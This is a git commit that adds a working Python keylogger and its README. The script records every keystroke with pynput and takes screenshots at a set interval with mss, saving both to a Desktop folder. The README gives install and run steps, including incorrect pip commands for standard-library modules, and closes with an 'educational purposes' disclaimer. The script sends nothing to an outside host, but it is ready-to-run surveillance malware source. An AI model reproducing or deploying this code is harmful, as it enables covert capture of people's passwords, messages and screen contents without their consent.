8f6bbb0ccbb6c063d30b5a02fb6501325ffaf462
Aryan Gupta <52730438+Aryan529@users.noreply.github.com>
2020-08-13 22:35:20 +0530

    Add files via upload

---
+++ Keylogger.py
@@ -0,0 +1,70 @@
+
+import _thread
+from mss import mss                     #To take screenshots
+from pynput.keyboard import Listener    #To keep record of pressed Keys
+from threading import Timer,Thread      #To run thing in parallel(screenshots and keylogs)
+import time                             #To record time of Screenshots
+import os                               #To make the System to intract with the
+
+count=0
+keys=[]                  #List all the pressed keys
+
+
+                                        
+class IntervalTimer(Timer):         #Control the Time interval between each Screenshots
+    def run(self):
+        while not self.finished.wait(self.interval):
+            self.function(*self.args, **self.kwargs)
+            
+            
+def write_file(keys):                  #To write the keys to the Files
+    with open("C:/Users/ARYAN/Desktop/Keylogger-master/log.txt","a") as f:
+        for key in keys:
+            k=str(key).replace("'","")
+            if k.find("space")>0:      #Replace Key_Space with " " in the main file
+                f.write(" ")
+            if k.find("enter")>0:      #Replace Key_Enter with "\n or nextline"
+                f.write("\n")
+            elif k.find("Key") == -1:   
+                f.write(k)
+                  
+
+class keylogger_main:
+    
+    def _build_logs(self):   #To create the directory which contains all the data
+        if not os.path.exists('C:/Users/ARYAN/Desktop/Keylogger-master'):
+            os.mkdir('C:/Users/ARYAN/Desktop/Keylogger-master')
+            os.mkdir('C:/Users/ARYAN/Desktop/Keylogger-master/Screenshots')
+            os.mknod('C:/Users/ARYAN/Desktop/Keylogger-master/log.txt')
+    
+    def _on_press(self,k):       #This Function keeps track of pressed keys
+        global keys, count
+        #print("{0} pressed".format(k))
+        keys.append(k)
+        count+=1
+    
+        if count >=10:
+            count=0
+            write_file(keys)
+            keys=[]   
+    
+    def _keylogger(self):            #Main Funciton to start the key tracker
+        with Listener(on_press=self._on_press) as listener:
+            listener.join()
+            
+    def _Screenshot(self):           #Main Function to start thr Screenshot tracker
+        sct=mss()
+        sct.shot(output='C:/Users/ARYAN/Desktop/Keylogger-master/Screenshots/{}.png'.format(time.time()))
+    
+    def run(self,interval):          #Main fucntion to start the keylogger
+        
+        self._build_logs()
+        Thread(target=self._keylogger).start()   #This thread function is used to Run the Keys and Screenshots tracker parallely
+        IntervalTimer(interval, self._Screenshot).start()
+        
+        
+km=keylogger_main() 
+interval=int(input("Enter the time interval (in sec.) between each Screenshot:"))
+km.run(interval)
+
+
---
+++ README.md
@@ -0,0 +1,38 @@
+# Keylogger
+Here I have made Keylogger in Python which can not just monitor what the individual is composing and furthermore take screen captures parallelly.
+# How to use?
+1. First of all you need to install all the mentioned python libraries in your device (Here i am assuming that latest Python version is installed in your device).
+<br/><b>Write the following commands in the cmd window:</b>
+
+```
+pip install mss
+```
+
+```
+pip install pynput
+```
+
+
+```
+pip install threading
+```
+
+
+```
+pip install os
+```
+
+2. Once you are done with all these libraries, you can download the "Keylogger.py" script and open it in any of the Python IDE(Jupyter Notebook, Spyder, IDLE..)
+<br/>
+3. Now, when you Run the script it will ask for "A Time interval which you want to be there in between each interval" and once you give the input then the keyogger will start tracking.
+<br/>
+<br />
+This Keylogger will make a new Directory on the Desktop named "Keylogger" where all the Screenshots and log file will be stored.
+
+# How to Stop?
+In order to stop this Keylogger, you have to stop the python script. 
+
+
+# Disclaimer
+This undertaking is just for Educational Purposes and the abuse of the data in this venture can result in criminal allegations brought against the people being referred to.<br/> 
+I am in no way responsible for the misuse of the information.
